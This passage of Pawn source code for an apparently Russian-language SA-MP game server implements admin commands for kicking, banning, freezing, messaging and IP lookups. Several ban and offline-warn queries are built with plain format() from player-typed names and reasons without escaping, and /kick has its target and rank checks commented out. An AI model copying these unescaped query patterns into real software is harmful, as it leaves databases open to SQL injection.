	else if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(!IsAbleToGosNewsRank(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Канал гос. новостей не доступен для Вас!");
	else if(gettime() < PI[playerid][P_GNEWS_TIME]) return SendClientMessage(playerid, COLOR_GREY, "Вы достигли лимита сообщений");
	else if(sscanf(params, "s[128]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /gnews [текст]");
	else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
	new string[128];
	format(string, sizeof(string), "[Гос. новости] %s: %s", GetName(playerid), params[0]);
	SendClientMessageToAll(0x4466CCFF, string);

	PI[playerid][P_GNEWS] ++;

	if(PI[playerid][P_GNEWS] >= 5)
	{
		PI[playerid][P_GNEWS_TIME] = gettime() + 60*5;

		SendClientMessage(playerid, C_RED, "Вы достигли лимита сообщений. Следующие 5 сообщений можно будет отправить через 5 минут");

		return 1;
	}
	return 1;
}

CMD:reports(playerid) return callcmd::rep(playerid);
CMD:rep(playerid)
{
    if(PI[playerid][pAdmin] < 1) return 1;
    ShowPlayerAdminReportList(playerid);
    return 1;
}
CMD:ask(playerid) return callcmd::report(playerid);
CMD:report(playerid)
{
	if(GetPVarInt(playerid, "report_id")) return SendClientMessage(playerid, COLOR_RED, !"Ваша жалоба уже рассматривается администрацией. Пожалуйста, ожидайте ответ.");
	ShowPlayerDialog(playerid, 799, DIALOG_STYLE_INPUT, "{0080BB}Создание репорта", "{FFFFFF}Пожалуйста, введите текст своего сообщения для администрации.", "Готово", "Закрыть");
    return 1;
}

CMD:pm(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "us[128]", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /pm [ID] [текст]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new string[144];
	format(string, sizeof(string), "Администратор %s(%d) ответил Вам: %s", GetName(playerid), playerid, params[1]);
	SendClientMessage(params[0], 0xFFAA44FF, string);
	format(string, sizeof(string), "Администратор %s[%d] ответил игроку %s[%d]: %s", GetName(playerid), playerid, GetName(params[0]), params[0], params[1]);
	SendAdminMessage(0xFFAA44FF, string);

	mysql_format(dbHandle, string, sizeof string, "UPDATE "T_ADMIN" SET `ans` = ans+1 WHERE `name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, string, "", "");
	return 1;
}

CMD:ans(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "us[128]", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /ans [ID] [текст]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new string[144];
	format(string, sizeof(string), "Администратор №%d ответил Вам: %s", PI[playerid][pID], params[1]);
	SendClientMessage(params[0], 0xFFAA44FF, string);
	format(string, sizeof(string), "Администратор %s[%d] ответил игроку %s[%d]: %s", GetName(playerid), playerid, GetName(params[0]), params[0], params[1]);
	SendAdminMessage(0xFFAA44FF, string);

	mysql_format(dbHandle, string, sizeof string, "UPDATE "T_ADMIN" SET `ans` = ans+1 WHERE `name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, string, "", "");

	return 1;
}

CMD:freeze(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /freeze [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PlayerFreezed[params[0]] == true) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок уже заморожен");
	new string[128];
	format(string, sizeof(string), "[A] %s[%i] заморозил %s[%d]", GetName(playerid), playerid, GetName(params[0]), params[0]);
	SendAdminMessage(COLOR_GREY, string);
	format(string, sizeof(string), "Администратор %s заморозил Вас", GetName(playerid));
	SendClientMessage(params[0], COLOR_RED, string);
	TogglePlayerControllable(params[0], 0);
	PlayerFreezed[params[0]] = true;
	return 1;
}

CMD:unfreeze(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /unfreeze [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PlayerFreezed[params[0]] == false) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не заморожен");
	new string[128];
	format(string, sizeof(string), "[A] %s[%i] разморозил %s[%d]", GetName(playerid), playerid, GetName(params[0]), params[0]);
	SendAdminMessage(COLOR_GREY, string);
	format(string, sizeof(string), "Администратор %s разморозил Вас", GetName(playerid));
	SendClientMessage(params[0], COLOR_RED, string);
	TogglePlayerControllable(params[0], 1);
	PlayerFreezed[params[0]] = false;
	return 1;
}

CMD:kick(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "uS()[32]", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /kick [ID] [причина]");
	//else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
   	//else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
    //else if(PI[playerid][pAdmin] <= PI[params[0]][pAdmin]) return AttemptRemoveAdmin(playerid);
    else if(IsIpFound(params[1]) || CheckString(params[1])&& !IsPlayerDeveloperAdmin(playerid)) return AdminAntisliv(playerid, params[1]);


	admin_attempt[playerid] ++ ;
	if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
	if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
	{
	    new ban_str[128];
		format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
		SendClientMessageToAll(0xFE0000AA, ban_str);
		SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
	    admin_ban_time[playerid] = 600;
		MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
	    admin_attempt[playerid] = 0;
	    admin_check_time[playerid] = 0;
		SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
		return true;
	}

    new string[128];
	if(strlen(params[1])) format(string, sizeof(string), "Администратор %s кикнул игрока %s. Причина: %s", GetName(playerid), GetName(params[0]), params[1]);
	else format(string, sizeof(string), "Администратор %s кикнул игрока %s.", GetName(playerid), GetName(params[0]));
	SendAdminMessageToAll(COLOR_RED, string, params[0]);
	Kick(params[0]);

	mysql_format(dbHandle, string, sizeof string, "UPDATE "T_ADMIN" SET `kicks` = kicks+1 WHERE `name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, string, "", "");
	return 1;
}

CMD:skick(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /skick [id игрока]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
    if(PI[playerid][pAdmin] <= PI[params[0]][pAdmin]) return AttemptRemoveAdmin(playerid);
	new string[128];
	format(string, sizeof(string), "[A] %s[%d] тихо кикнул игрока %s [ID:%d]", GetName(playerid), playerid, GetName(params[0]), params[0]);
	SendAdminMessage(COLOR_GREY, string);

	admin_attempt[playerid] ++ ;
	if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
	if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
	{
	    new ban_str[128];
		format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
		SendClientMessageToAll(0xFE0000AA, ban_str);
		SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
	    admin_ban_time[playerid] = 600;
		MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
	    admin_attempt[playerid] = 0;
	    admin_check_time[playerid] = 0;
		SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
		return true;
	}
	Kick(params[0]);
	return 1;
}

CMD:check(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /check [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	ShowPlayerStatsDialog(playerid, params[0]);
	return 1;
}

CMD:setstat(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7) return 1;

	if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setstats [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	NameStats[playerid] = params[0];
	ShowPlayerDialog(playerid, D_UCPADMIN, DIALOG_STYLE_LIST, GetName(params[0]), "Ник\nУровень\nОпыт\nПол\nИгральные фишки", "Принять", "Отмена");

	return 1;
}

CMD:sban(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "ids[32]", params[0], params[1], params[2])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /sban [id игрока] [кол-во дней] [причина]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
    else if(PI[playerid][pAdmin] <= PI[params[0]][pAdmin]) return AttemptRemoveAdmin(playerid);
    else if(IsIpFound(params[2]) || CheckString(params[2])&& !IsPlayerDeveloperAdmin(playerid)) return AdminAntisliv(playerid, params[2]);
	else if(params[1] > 30 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество дней от 1 до 30!");
	new string[128];
	format(string, sizeof(string), "[A] %s[%d] тихо забанил игрока %s на %d дней. Причина: %s", GetName(playerid), playerid, GetName(params[0]),params[1], params[2]);
	SendAdminMessage(COLOR_GREY,string);
	admin_attempt[playerid] ++ ;
	if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
	if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
	{
	    new ban_str[128];
		format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
		SendClientMessageToAll(0xFE0000AA, ban_str);
		SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
	    admin_ban_time[playerid] = 600;
		MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
	    admin_attempt[playerid] = 0;
	    admin_check_time[playerid] = 0;
		SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
		return true;
	}
	new data[15], unbandate;
	getdate(years, months, days);
	unbandate = gettime() + params[1]*86400;
	format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', '%s', '%s', '%s', %d, %d, '%s')", GetName(params[0]), GetName(playerid), PI[params[0]][pIP], data, params[1], unbandate, params[2]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	Kick(params[0]);
	return 1;
}

CMD:getip(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /getip [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	//else if(GetString(GetName(playerid), NGA1)) return SendClientMessage(playerid, COLOR_GREY, "Нельзя просмотреть IP данного администратора!");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[%s] [IP: %s]-[RegIP: %s]-[LastIP: %s]", GetName(params[0]),PI[params[0]][pIP],PI[params[0]][pRegIP],PI[params[0]][pLastIP]);
	SendClientMessage(playerid, COLOR_YELLOW, STRING_GLOBAL);
	return 1;
}
CMD:pgetip(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "s[60]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /pgetip [ip адрес]");
	new string[128];
	format(string, sizeof(string), "- - - - Совпадение с: %s. - - - -", params[0]);
    SendClientMessage(playerid, COLOR_LIME, string);
	foreach(new i: Player)
  	{
  	    new playerip[16];
  	    if(i != playerid && PlayerLogged[i])
  	    {
		    GetPlayerIp(i, playerip, sizeof(playerip));
		    if(GetString(playerip, params[0]))
		    {
				format(string, sizeof(string), "- %s[%d]", GetName(i), i, playerip);
				SendClientMessage(playerid, COLOR_ORANGE, string);
		    }
		}
	}
	return 1;
}

CMD:iban(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	if(sscanf(params, "uS()[32]", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /iban [id игрока] [причина]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
    else if(PI[playerid][pAdmin] <= PI[params[0]][pAdmin]) return AttemptRemoveAdmin(playerid);
	else if(IsIpFound(params[1]) || CheckString(params[1]) && !IsPlayerDeveloperAdmin(playerid)) return AdminAntisliv(playerid, params[1]);
	PI[params[0]][pSpawnChange] = 0;
	MysqlUpdatePlayerInt(params[0], "spawnchange", PI[params[0]][pSpawnChange]);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[Внимание] %s %s[%d] заблокировал аккаунт %s[%d] навсегда. Причина: %s", admin_rank_name[PI[playerid][pAdmin]], GetName(playerid), playerid, GetName(params[0]), params[0], params[1]);
	SendAdminMessage(0xFF0000FF, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s %s[%d] заблокировал Ваш аккаунт навсегда. Причина: %s", admin_rank_name[PI[playerid][pAdmin]], GetName(playerid), playerid, params[1]);
	SendClientMessage(params[0], 0xFF0000FF, STRING_GLOBAL);

	new data[15], unbandate;
	getdate(years, months, days);
	unbandate = gettime() + 99999*86400;
	format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO bans (name, whobanned, ip, bandate, unbandate, reason, ban_type) VALUES ('%s', '%s', '%s', '%s', %d, '%s', '1')", GetName(params[0]), GetName(playerid), PI[params[0]][pIP], data, unbandate, params[1]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	ResetPlayerWeapons(params[0]);
	Kick(params[0]);
	return 1;
}

CMD:ban(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	if(sscanf(params, "udS()[32]", params[0], params[1], params[2])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /ban [id игрока] [кол-во дней] [причина]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] > 30 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество дней от 1 до 30!");
    else if(PI[playerid][pAdmin] <= PI[params[0]][pAdmin]) return AttemptRemoveAdmin(playerid);
	else if(IsIpFound(params[2]) || CheckString(params[2]) && !IsPlayerDeveloperAdmin(playerid)) return AdminAntisliv(playerid, params[2]);
	PI[params[0]][pSpawnChange] = 0;
	MysqlUpdatePlayerInt(params[0], "spawnchange", PI[params[0]][pSpawnChange]);
	new string[128];
	if(strlen(params[2])) format(string, sizeof(string), "Администратор %s забанил игрока %s на %d дней. Причина: %s", GetName(playerid), GetName(params[0]), params[1], params[2]);
	else format(string, sizeof(string), "Администратор %s забанил игрока %s на %d дней.", GetName(playerid), GetName(params[0]), params[1]);
	SendAdminMessageToAll(COLOR_RED, string, params[0]);
	admin_attempt[playerid] ++ ;
	if(!GetPVarInt(playerid, "CHECKTIME")) admin_check_time[playerid] = gettime() + 20, SetPVarInt(playerid, "CHECKTIME", 1);
	if(admin_attempt[playerid] >= 3 && admin_check_time[playerid] > gettime())
	{
	    new ban_str[128];
		format(ban_str, sizeof ban_str, "Внимание! Администратору %s были заблокированы действия на сервере по подозрению во взломе.", GetName(playerid));
		SendClientMessageToAll(0xFE0000AA, ban_str);
		SendClientMessageToAll(0xFE0000AA, "Сообщите об этом основателю, так как возможен взлом!");
	    admin_ban_time[playerid] = 600;
		MysqlUpdatePlayerInt(playerid, "ban_time", admin_ban_time[playerid]);
	    admin_attempt[playerid] = 0;
	    admin_check_time[playerid] = 0;
		SendClientMessage(playerid, COLOR_RED, "Ваши действия были заблокированы по подозрению в сливе, администрация оповещена");
		return true;
	}
	new data[15], unbandate;
	getdate(years, months, days);
	unbandate = gettime() + params[1]*86400;
	format(data, sizeof(data), "%02d.%02d.%04d", days, months, years);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', '%s', '%s', '%s', %d, %d, '%s')", GetName(params[0]), GetName(playerid), PI[params[0]][pIP], data, params[1], unbandate, params[2]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
 //SendClientMessage(params[0], COLOR_YELLOW, "Ваш аккаунт заблокирован! Обязательно сделайте скриншот данного сообщения или Ваша жалоба не будет принята!");
	ResetPlayerWeapons(params[0]);
	Kick(params[0]);

    STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE "T_ADMIN" SET `bans` = bans+1 WHERE `name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	return 1;
}

CMD:offban(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new playername[MAX_PLAYER_NAME], countday, reason[32];
	if(sscanf(params, "s[60]is[60]", playername, countday, reason)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offban [ник игрока] [кол-во дней] [причина]");
	else if(CheckExceptionName(playername)) return AttemptRemoveChiefAdmin(playerid);
	else if(IsIpFound(reason) || CheckString(reason) && !IsPlayerDeveloperAdmin(playerid)) return AdminAntisliv(playerid, reason);
	else if(IsPlayerConnected(GetPlayerID(playername))) return SendClientMessage(playerid, COLOR_GREY, "Игрок в сети, используйте команду /ban");
	else if(countday > 30 || countday < 1) return SendClientMessage(playerid, COLOR_GREY, "Количество дней от 1 до 30!");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%s'", playername);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerOffban", "isis", playerid, playername, countday, reason);
	return 1;
}

CMD:ainfo(playerid, params[])
{
	if(PI[playerid][pAdmin] < 4)
		return 1;

	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /ainfo [ник]");

	new fmt_query[50+MAX_PLAYER_NAME],
		Cache: result,
		rows;

	mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM admin WHERE name='%s' LIMIT 1", params);
	result = mysql_query(dbHandle, fmt_query);

	rows = cache_num_rows();

	if(rows)
	{
		new level,
			set_admin[MAX_PLAYER_NAME],
			set_date[64],
			status[10],
			last_connect[64],
			online,
			ans,
			kicks,
			warns,
			bans,
			jails,
			mutes,
			id,
			fmt_msg[64],
			fmt_dialog[sizeof(fmt_msg)*15];

		level = cache_get_row_int(0, 1);
		cache_get_field_content(0, "put_admin", set_admin);
		cache_get_field_content(0, "data", set_date);

		id = GetPlayerID(params);

		if(id != INVALID_PLAYER_ID) status = "в сети";
		else status = "не в сети";

		cache_get_field_content(0, "last_connect", last_connect);

		online = cache_get_field_content_int(0, "timemin", dbHandle);

		ans = cache_get_row_int(0, 11);
		kicks = cache_get_row_int(0, 12);
		warns = cache_get_row_int(0, 13);
		bans = cache_get_row_int(0, 14);
		mutes = cache_get_row_int(0, 16);
		jails = cache_get_row_int(0, 15);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Ник: {ffcc00}%s\n", params);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Уровень администратирования: {ffcc00}%d\n", level);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Назначил: {ffcc00}%s\n", set_admin);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Дата назначения: {ffcc00}%s\n", set_date);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Статус: {ffcc00}%s\n", status);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Последний вход: {ffcc00}%s\n", last_connect);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Сегодня в сети: {ffcc00}%s\n", Converts(online));
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Статистика(за всё время):\n\n");
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Ответов на репорт: {ffcc00}%d\n", ans);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Киков: {ffcc00}%d\n", kicks);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Варнов: {ffcc00}%d\n", warns);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Банов: {ffcc00}%d\n", bans);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Затычек: {ffcc00}%d\n", mutes);
		strcat(fmt_dialog, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{FFFFFF}Джаилов: {ffcc00}%d\n", jails);
		strcat(fmt_dialog, fmt_msg);

		ShowPlayerDialog
		(
			playerid, 0, DIALOG_STYLE_MSGBOX,
			"{ffcc00}Статистика администратора",
			fmt_dialog,
			"Закрыть", ""
		);

	}
	else SendClientMessage(playerid, C_RED, "Такой администратор не найден");
	cache_delete(result);
	return 1;
}

CMD:offwarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new playername[MAX_PLAYER_NAME], reason[32];
	if(sscanf(params, "s[60]s[60]", playername, reason)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /offwarn [ник игрока] [причина]");
	else if(CheckExceptionName(playername)) return AttemptRemoveChiefAdmin(playerid);
	else if(IsIpFound(reason) || CheckString(reason) && !IsPlayerDeveloperAdmin(playerid)) return AdminAntisliv(playerid, reason);
	else if(GetPlayerID(playername) != INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Игрок в сети, используйте команду /warn");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%s'", playername);
	mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerOffwarn", "iss", playerid, playername, reason);
	return 1;
}

CMD:aunwarn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 5) return SendClientMessage(playerid, -1, "У Вас нет доступа к этой команде");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /aunwarn [id игрока]");
	else if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID || params[0] == playerid) return SendMess(playerid, MSG_PLAYER_OFFLINE);
